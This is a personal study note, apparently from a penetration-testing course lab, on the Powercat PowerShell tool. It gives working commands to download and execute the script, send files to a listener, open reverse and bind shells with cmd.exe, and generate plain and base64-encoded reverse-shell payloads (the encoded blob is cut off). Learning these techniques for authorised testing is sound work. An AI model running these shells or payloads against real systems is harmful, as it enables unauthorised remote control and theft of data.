---
id: tools-powercat
tags: ["kali", "tool", "exfiltration", "secure"]
created: 2023-01-12 11:56
---
# tools-powercat

backlinks: [[]]

sources:

---

Powercat is essentially the PowerShell version of Netcat written by besimorhino
https://github.com/besimorhino/powercat/blob/master/powercat.ps1

```powershell
# run from the web 

iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# or run locally
curl -o powercat.ps1 https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
# full stop space full stop backslash
. .\powercat.ps1
```

listen on port 8000

```shell
powercat -l -p 8000
```



## transfer files from WindowsBob to LinuxAlice 

```shell
#LinuxAlice sets up listener 
sudo nc -nlvp 443 > receiving_file.txt

```

```powershell
# WindowsBob invokes powercat to send the file
powercat -c 10.11.0.4 -p 443 -i c:\users\sending_file.txt

```

```shell
#LinuxAlice checks for file
ls receiveing_file.txt
receiving_file.txt

```

## reverse shell from WindowsBob to LinuxAlice

```shell
# LinuxAlice sets up listener
sudo nc -nlvp 443
listening on [any] 443 ...
```

```powershell
# WindowsBob invokes powercat
powercat 10.11.0.4 -p 443 -e cmd.exe
```

LinuxAlice has shell

```shell

connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>


```
## bind shell from LinuxAlice to WindowsBob

```powershell
# WindowsBob invokes powercat as a listener
powercat -l -p 443 -e cmd.exe
```

LinuxAlice connects and has shell

```shell
nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```

## powercat generate payloads

Powercat can also generate stand-alone payloads. In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user. Let's experiment with payloads in this next example.

After starting a listener on Alice's machine, we create a stand-alone reverse shell payload by adding the -g option to the previous powercat command and redirecting the output to a file. This will produce a powershell script that Bob can execute on his machine.

```shell
# LinuxAlice sets up listener
sudo nc -nlvp 443
listening on [any] 443 ...
```

### NEW CHARACTER - WINDOWSALICE 

WindowsAlice is Alice using a test windows box with powercat in c:\tools\practicaltools

```powershell
# WindowsAlice creates a powershell payload from powercat

powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

-a----        1/13/2020   5:16 AM          37641 powercat.ps1
-a----        1/21/2023   8:47 PM          17416 reverseshell.ps1

```

This payload can easily be detected by IDS because it is big, contains hardcoded strings which are easily identifiable

## create a standalone encoded payload using -ge

```powershell
# WindowsAlice creates a powershell payload from powercat

powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

# WindowsBob now needs to execute this command
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA

```

LinuxAlice has shell

```shell

kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725

PS C:\Users\offsec>

```
